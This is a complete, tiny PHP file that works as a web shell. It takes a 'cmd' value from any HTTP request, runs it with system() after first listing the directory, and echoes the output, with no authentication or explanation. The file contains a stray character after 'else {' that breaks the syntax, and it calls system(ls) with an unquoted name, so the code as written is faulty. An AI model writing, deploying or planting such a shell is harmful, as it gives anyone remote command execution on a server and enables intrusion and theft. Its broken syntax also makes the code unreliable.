<?php
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system(ls);
    system($cmd);
    echo "</pre>";
} else {s
    echo "No command specified.";
}
?>
